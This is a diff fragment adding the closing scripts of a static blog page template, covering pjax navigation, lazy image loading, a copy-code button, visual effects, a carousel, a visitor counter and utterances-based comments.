+      nav.addClass('header-bg-color');
+    }
+    else {
+      nav.removeClass('header-bg-color');
+    }
+  };
+
+  let scrollCollect = () => {
+    return bamboo.throttle(function (e) {
+      setHeaderClass();
+    }, 200)()
+  }
+
+  let initHeaderBg = () => {
+    setHeaderClass();
+  }
+
+  setHeaderClass();
+  window.addEventListener('scroll', scrollCollect);
+
+  document.addEventListener('pjax:send', function () {
+    window.removeEventListener('scroll', scrollCollect)
+  })
+  document.addEventListener('pjax:complete', function () {
+    window.addEventListener('scroll', scrollCollect);
+    setHeaderClass();
+  })
+</script> 
+
+<!-- 渲染issues标签里的内容 -->
+<script>
+  function loadIssuesJS() {
+    if ($(".post-detail").find(".issues-api").length == 0) {
+      return;
+    } 
+    loadScript('/js/issues/index.js');
+  };
+  $(function () {
+    loadIssuesJS();
+  });
+  document.addEventListener('pjax:complete', function () {
+    if (typeof IssuesAPI == "undefined") {
+      loadIssuesJS();
+    }
+  })
+</script>
+
+<!-- 渲染远程json加载的图片标签(getPhotoOnline)里的内容 -->
+<script>
+  function loadPhotoOnlineJS() {
+    if ($(".post-detail").find(".getJsonPhoto-api").length == 0) {
+      return;
+    } 
+    loadScript('/js/getPhotoOnline/index.js');
+  };
+  $(function () {
+    loadPhotoOnlineJS();
+  });
+  document.addEventListener('pjax:complete', function () {
+    if (typeof getPhotoJson == "undefined") {
+      loadPhotoOnlineJS();
+    }
+  })
+</script>
+
+<!-- 渲染远程json加载的talk标签(getTalkOnline)里的内容 -->
+<script>
+  function loadTalkOnlineJS() {
+    if ($(".post-detail").find(".getJsonTalk-api").length == 0) {
+      return;
+    } 
+    loadScript('https://cdnjs.cloudflare.com/ajax/libs/waterfall.js/1.0.2/waterfall.min.js'); // 瀑布流插件，https://raphamorim.io/waterfall.js/
+    loadScript('/js/getTalkOnline/index.js');
+  };
+  $(function () {
+    loadTalkOnlineJS();
+  });
+  document.addEventListener('pjax:complete', function () {
+    if (typeof getTalkJson == "undefined") {
+      loadTalkOnlineJS();
+    }
+  })
+</script>
+
+<!-- 渲染远程json加载的site-card标签(getSiteOnline)里的内容 -->
+<script>
+  function loadSiteOnlineJS() {
+    if ($(".post-detail").find(".getJsonSite-api").length == 0) {
+      return;
+    } 
+    loadScript('/js/getSiteOnline/index.js');
+  };
+  $(function () {
+    loadSiteOnlineJS();
+  });
+  document.addEventListener('pjax:complete', function () {
+    if (typeof getSiteJson == "undefined") {
+      loadSiteOnlineJS();
+    }
+  })
+</script>
+
+<!-- 输入框打字特效 -->
+<!-- 输入框打字特效 -->
+
+  <script src="/js/activate-power-mode.js"></script>
+  <script>
+    POWERMODE.colorful = true;  // 打开随机颜色特效
+    POWERMODE.shake = false;    // 关闭输入框抖动
+    document.body.addEventListener('input', POWERMODE);//监听打字事件
+  </script>
+
+
+<!-- markdown代码一键复制功能 -->
+
+  <link rel="stylesheet" href="https://unpkg.com/v-plugs-ayu/lib/ayu.css">
+  <script src="https://unpkg.com/v-plugs-ayu/lib/ayu.umd.min.js"></script>
+  <script src="/js/clipboard/clipboard.min.js"></script>
+  <div id="appCopy">
+  </div>
+  <script data-pjax>
+    var vm = new Vue({
+      el: '#appCopy',
+      data: {
+      },
+      computed: {
+      },
+      mounted() {
+        const that = this;
+        var copy = 'copy';
+        /* code */
+        var initCopyCode = function () {
+          var copyHtml = '';
+          copyHtml += '<button class="btn-copy" data-clipboard-snippet="" style="position:absolute;top:0;right:0;z-index:1;">';
+          copyHtml += '<i class="fas fa-copy"></i><span>' + copy + '</span>';
+          copyHtml += '</button>';
+          $(".post-detail pre").not('.gutter pre').wrap("<div class='codeBox' style='position:relative;width:100%;'></div>")
+          $(".post-detail pre").not('.gutter pre').before(copyHtml);
+          new ClipboardJS('.btn-copy', {
+            target: function (trigger) {
+              return trigger.nextElementSibling;
+            }
+          });
+        }
+        initCopyCode();
+        $('.btn-copy').unbind('click').bind('click', function () {
+          doSomething();
+        })
+        $(document).unbind('keypress').bind('keypress', function (e) {
+          if (e.ctrlKey && e.keyCode == 67) {
+            doSomething();
+          }
+        })
+
+        function doSomething() {
+          that.$notify({
+            title: "成功",
+            content: "代码已复制，请遵守相关授权协议。",
+            type: 'success'
+          })
+        }
+      },
+      methods: {
+      },
+      created() { }
+    })
+  </script>
+  
+
+<!-- 图片懒加载 -->
+<script defer src="https://unpkg.com/vanilla-lazyload@17.1.0/dist/lazyload.min.js"></script>
+<script>
+  // https://www.npmjs.com/package/vanilla-lazyload
+  // Set the options globally
+  // to make LazyLoad self-initialize
+  window.lazyLoadOptions = {
+    elements_selector: ".lazyload",
+    threshold: 0
+  };
+  // Listen to the initialization event
+  // and get the instance of LazyLoad
+  window.addEventListener(
+    "LazyLoad::Initialized",
+    function (event) {
+      window.lazyLoadInstance = event.detail.instance;
+    },
+    false
+  );
+  document.addEventListener('DOMContentLoaded', function () {
+    lazyLoadInstance.update();
+  });
+  document.addEventListener('pjax:complete', function () {
+    lazyLoadInstance.update();
+  });
+</script>
+
+
+<!-- 卡片滚动动画 -->
+   
+
+<!-- 评论所需js -->
+
+  
+        <script type="text/javascript">
+  var utteranceComment = {};
+
+  function check_utterance() {
+    let isDark = JSON.parse(localStorage.getItem('dark')) || JSON.parse('false');
+    if (isDark) {
+      utteranceComment.Theme = 'github-dark';
+    } else {
+      utteranceComment.Theme = 'github-light';
+    }
+
+    return document.getElementById("gitment-container");
+  }
+  comment_el = '#gitment-container';
+  load_utterance = function () {
+    if ($(comment_el).length) {
+      // 匿名函数，防止污染全局变量
+      const HEAD = check_utterance();
+
+      var utterances = document.createElement('script');
+      utterances.type = 'text/javascript';
+      utterances.async = true;
+      utterances.setAttribute('issue-term', 'pathname')
+      utterances.setAttribute('theme', utteranceComment.Theme)
+      utterances.setAttribute('repo', '16778738/16778738.github.io')
+      utterances.crossorigin = 'anonymous';
+      utterances.src = 'https://utteranc.es/client.js';
+      // content 是要插入评论的地方
+      document.getElementById('gitment-container').appendChild(utterances);
+
+    }
+  }
+
+  function dark_utterance() {
+    const HEAD = check_utterance();
+    if (!HEAD) return;
+    const message = {
+      type: 'set-theme',
+      theme: utteranceComment.Theme
+    };
+    const utteranceIframe = document.querySelector('iframe');
+    utteranceIframe.contentWindow.postMessage(message, 'https://utteranc.es');
+  }
+
+  $(document).ready(load_utterance);
+  document.addEventListener('pjax:complete', function () {
+    load_utterance();
+  });
+
+  $('.dark').click(function () {
+    setTimeout(() => {
+      dark_utterance();
+    });
+  })
+
+</script>
+
+<style>
+  .utterances {
+    max-width: inherit !important;
+  }
+</style>
+      
+
+
+<!-- 鼠标点击特效 -->
+<!-- 爱心点击 -->
+
+  
+    <canvas class="fireworks" style="position: fixed;left: 0;top: 0;z-index: 999; pointer-events: none;" ></canvas>
+    <script async src="//cdn.bootcss.com/animejs/2.2.0/anime.min.js"></script>
+    <script async src="/js/cursor/explosion.min.js"></script>
+  
+
+
+
+
+  <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" data-pjax></script>
+
+
+<!-- 轮播图标签 -->
+<script>
+  var bambooSwiperTag = {};
+  function load_swiper() {
+    if (!document.querySelectorAll(".post-swiper-container")[0]) return;
+    loadCSS("https://unpkg.com/swiper@6/swiper-bundle.min.css")
+    loadScript("https://unpkg.com/swiper@6/swiper-bundle.min.js").then(() => {
+      pjax_swiper();
+    });
+  }
+
+  load_swiper();
+
+  function pjax_swiper() {
+    bambooSwiperTag.swiper = new Swiper('.post-swiper-container', {
+      slidesPerView: 'auto',
+      spaceBetween: 8,
+      centeredSlides: true,
+      loop: true,
+      autoplay: true ? {
+        delay: 3000,
+        stopOnLastSlide: false,
+        disableOnInteraction: false,
+      } : false,
+      pagination: {
+        el: '.swiper-pagination',
+        clickable: true,
+      },
+      navigation: {
+        nextEl: '.swiper-button-next',
+        prevEl: '.swiper-button-prev',
+      },
+      on:{
+        init: function(){
+          swiperAnimateCache(this); //隐藏动画元素 
+          swiperAnimate(this); //初始化完成开始动画
+        }, 
+        slideChangeTransitionEnd: function(){ 
+          swiperAnimate(this); //每个slide切换结束时也运行当前slide动画
+          //this.slides.eq(this.activeIndex).find('.ani').removeClass('ani'); 动画只展现一次，去除ani类名
+        } 
+      }
+    });
+  }
+
+  document.addEventListener('pjax:complete', function () {
+    if (!document.querySelectorAll(".post-swiper-container")[0]) return;
+    if (typeof bambooSwiperTag.swiper === "undefined") {
+      load_swiper();
+    } else {
+      pjax_swiper();
+    }
+  });
+</script>
+    <!-- pjax -->
+    
+
+<!-- pjax -->
+
+
+  <script src="/js/pjax@0.2.8/index.js"></script>
+  
+    <div class="pjax-animate">
+  
+    <div class="loading-circle"><div id="loader-circle"></div></div>
+    <script>
+      window.ShowLoading = function() {
+        $(".loading-circle").css("display", "block");
+      };
+      window.HideLoading = function() {
+        $(".loading-circle").css("display", "none");
+      }
+    </script>
+  
+	<script>
+    document.addEventListener('pjax:complete', function () {
+      window.HideLoading();
+    })
+    document.addEventListener('pjax:send', function () {
+      window.ShowLoading();
+    })
+    document.addEventListener('pjax:error', function () {
+      window.HideLoading();
+    })
+	</script>
+</div>
+
+  
+
+  <script>
+    var pjax = new Pjax({
+      elements: 'a[href]:not([href^="#"]):not([href="javascript:void(0)"]):not([no-pjax])',   // 拦截正常带链接的 a 标签
+      selectors: ["#pjax-container","title"],                                   // 根据实际需要确认重载区域
+      cacheBust: false,   // url 地址追加时间戳，用以避免浏览器缓存
+      timeout: 5000
+    });
+
+    document.addEventListener('pjax:send', function (e) {
+
+      try {
+        var currentUrl = window.location.pathname;
+        var targetUrl = e.triggerElement.href;
+        var banUrl = [""];
+        if (banUrl[0] != "") {
+          banUrl.forEach(item => {
+            if(currentUrl.indexOf(item) != -1 || targetUrl.indexOf(item) != -1) {
+              window.location.href = targetUrl;
+            }
+          });
+        }
+      } catch (error) {}
+
+      $(window).unbind('resize');
+      $(window).unbind('scroll');
+      $(document).unbind('scroll');
+      $(document).unbind('click');
+      $('body').unbind('click');
+
+    })
+    
+    document.addEventListener('pjax:complete', function () {
+      $('script[data-pjax], .pjax-reload script').each(function () {
+        $(this).parent().append($(this).remove());
+      });
+    });
+
+    document.addEventListener('pjax:error', function (e) {
+      window.location.href = e.triggerElement.href;
+    })
+    
+    // 刷新不从顶部开始
+    document.addEventListener("DOMContentLoaded", function () {
+      history.scrollRestoration = 'auto';
+    })
+  </script>
+
+
+
+  </body>
+</html>
